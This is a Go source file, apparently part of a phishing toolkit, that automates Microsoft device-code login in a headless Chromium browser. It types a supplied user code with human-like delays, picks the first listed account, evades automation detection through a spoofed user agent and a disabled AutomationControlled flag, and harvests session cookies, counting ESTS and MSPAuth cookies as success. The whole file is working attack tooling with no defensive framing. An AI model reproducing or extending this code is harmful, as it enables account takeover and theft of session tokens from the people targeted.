package core

import (
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
)

// AutoDeviceCodeManager handles automated device code login
type AutoDeviceCodeManager struct {
	mu           sync.RWMutex
	running      map[string]bool
	results      map[string]*AutoDeviceCodeResult
	enabled      bool
	headlessMode bool
}

// AutoDeviceCodeResult holds the outcome
type AutoDeviceCodeResult struct {
	Success     bool
	Error       string
	AccountUsed string
	Cookies     []string
	RedirectURL string
	CompletedAt time.Time
}

var autoDCMgr *AutoDeviceCodeManager
var autoDCMgrOnce sync.Once

// GetAutoDeviceCodeManager returns the singleton manager
func GetAutoDeviceCodeManager() *AutoDeviceCodeManager {
	autoDCMgrOnce.Do(func() {
		autoDCMgr = &AutoDeviceCodeManager{
			running:      make(map[string]bool),
			results:      make(map[string]*AutoDeviceCodeResult),
			enabled:      true,
			headlessMode: true,
		}
		go autoDCMgr.cleanupLoop()
	})
	return autoDCMgr
}

// SetEnabled enables/disables auto-device-code
func (m *AutoDeviceCodeManager) SetEnabled(enabled bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.enabled = enabled
}

// IsEnabled returns whether auto-device-code is enabled
func (m *AutoDeviceCodeManager) IsEnabled() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.enabled
}

// IsRunning checks if automation is running for a session
func (m *AutoDeviceCodeManager) IsRunning(sessionID string) bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.running[sessionID]
}

// GetResult returns the result for a session
func (m *AutoDeviceCodeManager) GetResult(sessionID string) *AutoDeviceCodeResult {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.results[sessionID]
}

// StartAutoLogin initiates automated device code login for a session
func (m *AutoDeviceCodeManager) StartAutoLogin(sessionID, userCode, verifyURL string) {
	if !m.IsEnabled() {
		log.Printf("[autodc] disabled - not starting for session %s", sessionID)
		return
	}

	m.mu.Lock()
	if m.running[sessionID] {
		m.mu.Unlock()
		log.Printf("[autodc] already running for session %s", sessionID)
		return
	}
	m.running[sessionID] = true
	m.mu.Unlock()

	log.Printf("[autodc] starting automation for session %s", sessionID)

	go func() {
		defer func() {
			m.mu.Lock()
			delete(m.running, sessionID)
			m.mu.Unlock()
			log.Printf("[autodc] finished for session %s", sessionID)
		}()

		result := m.executeLogin(userCode, verifyURL)
		result.CompletedAt = time.Now()

		m.mu.Lock()
		m.results[sessionID] = result
		m.mu.Unlock()

		if result.Success {
			log.Printf("[autodc] SUCCESS for session %s - cookies: %d", sessionID, len(result.Cookies))
		} else {
			log.Printf("[autodc] FAILED for session %s: %s", sessionID, result.Error)
		}
	}()
}

func (m *AutoDeviceCodeManager) executeLogin(userCode, verifyURL string) *AutoDeviceCodeResult {
	result := &AutoDeviceCodeResult{Success: false}

	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
	defer cancel()

	// Find chromium binary
	chromiumPaths := []string{
		"/usr/bin/chromium-browser",
		"/usr/bin/chromium",
		"/usr/bin/google-chrome-stable",
		"/usr/bin/google-chrome",
		"/snap/bin/chromium",
	}
	chromiumPath := ""
	for _, p := range chromiumPaths {
		if _, err := os.Stat(p); err == nil {
			chromiumPath = p
			break
		}
	}
	if chromiumPath == "" {
		result.Error = "chromium not found - install with: apt install chromium-browser chromium-chromedriver"
		return result
	}

	opts := []chromedp.ExecAllocatorOption{
		chromedp.NoSandbox,
		chromedp.DisableGPU,
		chromedp.Flag("headless", m.headlessMode),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-setuid-sandbox", true),
		chromedp.Flag("disable-blink-features", "AutomationControlled"),
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("disable-plugins", true),
		chromedp.Flag("disable-images", false),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("no-default-browser-check", true),
		chromedp.Flag("no-first-run", true),
		chromedp.Flag("mute-audio", true),
		chromedp.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
		chromedp.WindowSize(1920, 1080),
		chromedp.ExecPath(chromiumPath),
	}

	allocCtx, cancelAlloc := chromedp.NewExecAllocator(ctx, opts...)
	defer cancelAlloc()

	ctx, cancel = chromedp.NewContext(allocCtx)
	defer cancel()

	// Navigate to device login page
	var pageText string
	err := chromedp.Run(ctx,
		chromedp.Navigate(verifyURL),
		chromedp.Sleep(3*time.Second),
		chromedp.WaitVisible(`body`, chromedp.ByQuery),
		chromedp.OuterHTML(`html`, &pageText),
	)
	if err != nil {
		result.Error = fmt.Sprintf("navigation failed: %v", err)
		return result
	}

	// Detect UI version
	useNewUI := strings.Contains(pageText, "Enter the code") ||
		strings.Contains(pageText, "enter-code") ||
		strings.Contains(pageText, "code-input") ||
		strings.Contains(pageText, "verification code")

	if useNewUI {
		err = m.executeNewUI(ctx, userCode)
	} else {
		err = m.executeClassicUI(ctx, userCode)
	}

	if err != nil {
		result.Error = fmt.Sprintf("code entry failed: %v", err)
		return result
	}

	// Wait for authentication to complete
	var finalURL string
	var success bool
	err = chromedp.Run(ctx,
		chromedp.Sleep(3*time.Second),
		chromedp.Location(&finalURL),
		chromedp.ActionFunc(func(ctx context.Context) error {
			if strings.Contains(finalURL, "success") ||
				strings.Contains(finalURL, "app") ||
				strings.Contains(finalURL, "office.com") ||
				strings.Contains(finalURL, "account") ||
				strings.Contains(finalURL, "dashboard") ||
				strings.Contains(finalURL, "myaccount") {
				success = true
				return nil
			}
			if strings.Contains(finalURL, "microsoft") && !strings.Contains(finalURL, "devicelogin") {
				success = true
				return nil
			}
			return nil
		}),
	)
	if err == nil && success {
		result.Success = true
		result.RedirectURL = finalURL

		// Get cookies
		var cookies []string
		chromedp.Run(ctx,
			chromedp.ActionFunc(func(ctx context.Context) error {
				var cookieStr string
				err := chromedp.Evaluate(`document.cookie`, &cookieStr).Do(ctx)
				if err == nil && cookieStr != "" {
					cookies = strings.Split(cookieStr, "; ")
					result.Cookies = cookies
				}
				return nil
			}),
		)
		return result
	}

	// If cookies contain auth tokens, consider it success even without redirect
	var cookies []string
	err = chromedp.Run(ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			var cookieStr string
			err := chromedp.Evaluate(`document.cookie`, &cookieStr).Do(ctx)
			if err == nil && cookieStr != "" {
				cookies = strings.Split(cookieStr, "; ")
				result.Cookies = cookies
			}
			return nil
		}),
	)
	if err == nil && len(cookies) > 0 {
		for _, c := range cookies {
			if strings.Contains(c, "ESTS") ||
				strings.Contains(c, "MSPAuth") ||
				strings.Contains(c, "SignIn") ||
				strings.Contains(c, "auth") {
				result.Success = true
				result.RedirectURL = finalURL
				return result
			}
		}
	}

	result.Error = "authentication could not be completed"
	return result
}

func (m *AutoDeviceCodeManager) executeNewUI(ctx context.Context, userCode string) error {
	return chromedp.Run(ctx,
		chromedp.Sleep(1*time.Second),
		chromedp.ActionFunc(func(ctx context.Context) error {
			selectors := []string{
				`#code`,
				`input[type="text"]`,
				`#i0118`,
				`#codeInput`,
				`[data-testid="code-input"]`,
				`input[name="code"]`,
				`input[placeholder*="code" i]`,
				`input[aria-label*="code" i]`,
			}
			for _, sel := range selectors {
				var exists bool
				err := chromedp.Evaluate(fmt.Sprintf(`!!document.querySelector('%s')`, sel), &exists).Do(ctx)
				if err == nil && exists {
					chromedp.Click(sel, chromedp.ByQuery).Do(ctx)
					for _, ch := range userCode {
						time.Sleep(60 * time.Millisecond)
						chromedp.SendKeys(sel, string(ch), chromedp.ByQuery).Do(ctx)
					}
					return nil
				}
			}
			return fmt.Errorf("no code input field found")
		}),
		chromedp.Sleep(500*time.Millisecond),
		chromedp.ActionFunc(func(ctx context.Context) error {
			selectors := []string{
				`#next`,
				`#idSIButton9`,
				`input[type="submit"]`,
				`button[type="submit"]`,
				`.submit-button`,
				`[data-testid="submit"]`,
				`#verifyButton`,
				`[aria-label*="next" i]`,
				`[aria-label*="submit" i]`,
			}
			for _, sel := range selectors {
				var exists bool
				err := chromedp.Evaluate(fmt.Sprintf(`!!document.querySelector('%s')`, sel), &exists).Do(ctx)
				if err == nil && exists {
					return chromedp.Click(sel, chromedp.ByQuery).Do(ctx)
				}
			}
			return chromedp.KeyAction("Enter").Do(ctx)
		}),
		chromedp.Sleep(2*time.Second),
	)
}

func (m *AutoDeviceCodeManager) executeClassicUI(ctx context.Context, userCode string) error {
	return chromedp.Run(ctx,
		chromedp.Sleep(1*time.Second),
		chromedp.ActionFunc(func(ctx context.Context) error {
			var hasAccounts bool
			chromedp.Evaluate(`
				!!document.querySelector('.account-chooser') || 
				!!document.querySelector('.accounts-list') ||
				!!document.querySelector('[data-testid="account-chooser"]')
			`, &hasAccounts).Do(ctx)
			if hasAccounts {
				selectors := []string{
					`.account-chooser button:first-child`,
					`.accounts-list button:first-child`,
					`.account-item:first-child`,
					`[data-testid="account-chooser"] button:first-child`,
				}
				for _, sel := range selectors {
					err := chromedp.Click(sel, chromedp.ByQuery).Do(ctx)
					if err == nil {
						chromedp.Sleep(1 * time.Second).Do(ctx)
						return nil
					}
				}
			}
			return nil
		}),
		chromedp.ActionFunc(func(ctx context.Context) error {
			selectors := []string{
				`input[type="text"]`,
				`#i0118`,
				`#codeInput`,
				`input[name="code"]`,
				`input[placeholder*="code" i]`,
			}
			for _, sel := range selectors {
				var exists bool
				err := chromedp.Evaluate(fmt.Sprintf(`!!document.querySelector('%s')`, sel), &exists).Do(ctx)
				if err == nil && exists {
					chromedp.Click(sel, chromedp.ByQuery).Do(ctx)
					for _, ch := range userCode {
						time.Sleep(50 * time.Millisecond)
						chromedp.SendKeys(sel, string(ch), chromedp.ByQuery).Do(ctx)
					}
					return nil
				}
			}
			return chromedp.Evaluate(fmt.Sprintf(`
				var input = document.querySelector('input[type="text"], #i0118, #codeInput, input[name="code"]');
				if (input) {
					input.value = '%s';
					input.dispatchEvent(new Event('input', { bubbles: true }));
					return true;
				}
				return false;
			`, userCode), nil).Do(ctx)
		}),
		chromedp.Sleep(500*time.Millisecond),
		chromedp.ActionFunc(func(ctx context.Context) error {
			selectors := []string{
				`#next`,
				`#idSIButton9`,
				`input[type="submit"]`,
				`#verifyButton`,
				`[data-testid="submit"]`,
			}
			for _, sel := range selectors {
				var exists bool
				err := chromedp.Evaluate(fmt.Sprintf(`!!document.querySelector('%s')`, sel), &exists).Do(ctx)
				if err == nil && exists {
					return chromedp.Click(sel, chromedp.ByQuery).Do(ctx)
				}
			}
			return chromedp.KeyAction("Enter").Do(ctx)
		}),
		chromedp.Sleep(2*time.Second),
	)
}

func (m *AutoDeviceCodeManager) cleanupLoop() {
	ticker := time.NewTicker(5 * time.Minute)
	for range ticker.C {
		m.mu.Lock()
		for sid, result := range m.results {
			if time.Since(result.CompletedAt) > 30*time.Minute {
				delete(m.results, sid)
			}
		}
		m.mu.Unlock()
	}
}